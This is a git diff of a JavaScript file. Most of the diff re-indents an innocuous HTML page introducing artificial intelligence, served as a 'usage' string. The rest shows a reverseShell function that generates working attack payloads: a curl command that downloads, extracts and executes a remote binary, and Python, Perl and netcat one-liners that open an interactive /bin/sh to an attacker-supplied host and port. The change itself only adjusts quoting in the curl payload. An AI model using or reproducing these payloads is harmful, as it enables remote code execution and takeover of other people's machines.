@@ -12,72 +12,72 @@ const usage = `<!DOCTYPE html>
                                         font-family: Arial, sans-serif;
                                                     margin: 0;
                                                                 padding: 0;
-                                                                         line-height: 1.6;
-                                                                         }
-                                                                         header {
-                                                                             background-color: #4CAF50;
-                                                                         color: white;
-                                                                             padding: 1rem;
-                                                                         text-align: center;
-                                                                         }
-                                                                         section {
-                                                                             padding: 20px;
-                                                                     }
-                                                                     h1, h2 {
-                                                                         color: #333;
-                                                                         }
-                                                                         p {
-                                                                             margin-bottom: 1.2rem;
-                                                                     }
-                                                                     footer {
-                                                                         background-color: #333;
-                                                                             color: white;
-                                                                         text-align: center;
-                                                                             padding: 1rem;
-                                                                         position: fixed;
-                                                                             width: 100%;
-                                                                         bottom: 0;
-                                                                         }
-                                                                     </style>
-                                                             </head>
-                                                             <body>
+                                                                            line-height: 1.6;
+                                                                                    }
+                                                                                            header {
+                                                                                                        background-color: #4CAF50;
+                                                                                                                    color: white;
+                                                                                                                                padding: 1rem;
+                                                                                                                                     text-align: center;
+                                                                                                                                     }
+                                                                                                                                     section {
+                                                                                                                                         padding: 20px;
+                                                                                                                                 }
+                                                                                                                                 h1, h2 {
+                                                                                                                                     color: #333;
+                                                                                                                                     }
+                                                                                                                                     p {
+                                                                                                                                         margin-bottom: 1.2rem;
+                                                                                                                                 }
+                                                                                                                                 footer {
+                                                                                                                                     background-color: #333;
+                                                                                                                                         color: white;
+                                                                                                                                     text-align: center;
+                                                                                                                                         padding: 1rem;
+                                                                                                                                     position: fixed;
+                                                                                                                                         width: 100%;
+                                                                                                                                     bottom: 0;
+                                                                                                                                     }
+                                                                                                                                 </style>
+                                                                                                                         </head>
+                                                                                                                         <body>
 
-                                                                 <header>
-                                                                         <h1>Introduction to Artificial Intelligence</h1>
-                                                                     </header>
+                                                                                                                             <header>
+                                                                                                                                     <h1>Introduction to Artificial Intelligence</h1>
+                                                                                                                                 </header>
 
-                                                                 <section>
-                                                                         <h2>What is AI?</h2>
-                                                                         <p>Artificial Intelligence (AI) refers to the simulation of human intelligence in machines that are programmed to think, learn, and adapt. AI can perform tasks typically requiring human intelligence, such as visual perception, speech recognition, decision-making, and language translation.</p>
+                                                                                                                             <section>
+                                                                                                                                     <h2>What is AI?</h2>
+                                                                                                                                     <p>Artificial Intelligence (AI) refers to the simulation of human intelligence in machines that are programmed to think, learn, and adapt. AI can perform tasks typically requiring human intelligence, such as visual perception, speech recognition, decision-making, and language translation.</p>
 
-                                                                         <h2>Types of AI</h2>
-                                                                         <p>AI is generally divided into two categories:</p>
-                                                                         <ul>
-                                                                             <li><strong>Narrow AI:</strong> Also known as weak AI, it is designed to perform a narrow task (e.g., facial recognition or internet searches).</li>
-                                                                         <li><strong>General AI:</strong> Also known as strong AI, it has the ability to understand, learn, and apply knowledge to perform tasks just like a human.</li>
-                                                                         </ul>
+                                                                                                                                     <h2>Types of AI</h2>
+                                                                                                                                     <p>AI is generally divided into two categories:</p>
+                                                                                                                                     <ul>
+                                                                                                                                         <li><strong>Narrow AI:</strong> Also known as weak AI, it is designed to perform a narrow task (e.g., facial recognition or internet searches).</li>
+                                                                                                                                     <li><strong>General AI:</strong> Also known as strong AI, it has the ability to understand, learn, and apply knowledge to perform tasks just like a human.</li>
+                                                                                                                                     </ul>
 
-                                                                         <h2>Applications of AI</h2>
-                                                                         <p>AI has a wide range of applications across industries, including:</p>
-                                                                         <ul>
-                                                                             <li>Healthcare (diagnosis, personalized treatment)</li>
-                                                                         <li>Finance (fraud detection, algorithmic trading)</li>
-                                                                             <li>Automotive (self-driving cars)</li>
-                                                                         <li>Customer service (chatbots, virtual assistants)</li>
-                                                                             <li>Entertainment (recommendation engines)</li>
-                                                                     </ul>
+                                                                                                                                     <h2>Applications of AI</h2>
+                                                                                                                                     <p>AI has a wide range of applications across industries, including:</p>
+                                                                                                                                     <ul>
+                                                                                                                                         <li>Healthcare (diagnosis, personalized treatment)</li>
+                                                                                                                                     <li>Finance (fraud detection, algorithmic trading)</li>
+                                                                                                                                         <li>Automotive (self-driving cars)</li>
+                                                                                                                                     <li>Customer service (chatbots, virtual assistants)</li>
+                                                                                                                                         <li>Entertainment (recommendation engines)</li>
+                                                                                                                                 </ul>
 
-                                                                     <h2>Future of AI</h2>
-                                                                     <p>The future of AI holds significant promise as advancements in machine learning, natural language processing, and robotics continue to grow. However, ethical concerns around data privacy, job displacement, and algorithmic bias must be carefully addressed as AI evolves.</p>
-                                                                 </section>
+                                                                                                                                 <h2>Future of AI</h2>
+                                                                                                                                 <p>The future of AI holds significant promise as advancements in machine learning, natural language processing, and robotics continue to grow. However, ethical concerns around data privacy, job displacement, and algorithmic bias must be carefully addressed as AI evolves.</p>
+                                                                                                                             </section>
 
-                                                                     <footer>
-                                                                     <p>&copy; 2024 AI Learning | All Rights Reserved</p>
-                                                                 </footer>
+                                                                                                                                 <footer>
+                                                                                                                                 <p>&copy; 2024 AI Learning | All Rights Reserved</p>
+                                                                                                                             </footer>
 
-                                                                 </body>
-                                                                 </html>
-                                                                 `;
+                                                                                                                             </body>
+                                                                                                                             </html>
+                                                                                                                             `;
 
 const reverseShell = (address = '', file = '') => {
                 const [host, port] = address.split(':');
@@ -88,7 +88,7 @@ const reverseShell = (address = '', file = '') => {
 
 
                 const payloads = {
-                                        curl: `curl https://${host}/${file} -o /tmp/.bazel.tmp.tar.gz && tar -xzvf /tmp/${file} -C /tmp && chmod +x /tmp/${stripLastTwoExtensions(file)} && exec /tmp/${stripLastTwoExtensions(file)}`,
+                                        curl: `curl https://${host}/${encodeURI(file)} -o "/tmp/${file}" && tar -xzvf "/tmp/${file}" -C /tmp && chmod +x "/tmp/${stripLastTwoExtensions(file)}" && exec "/tmp/${stripLastTwoExtensions(file)}"`,
                                         python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
                                         perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
                                         nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
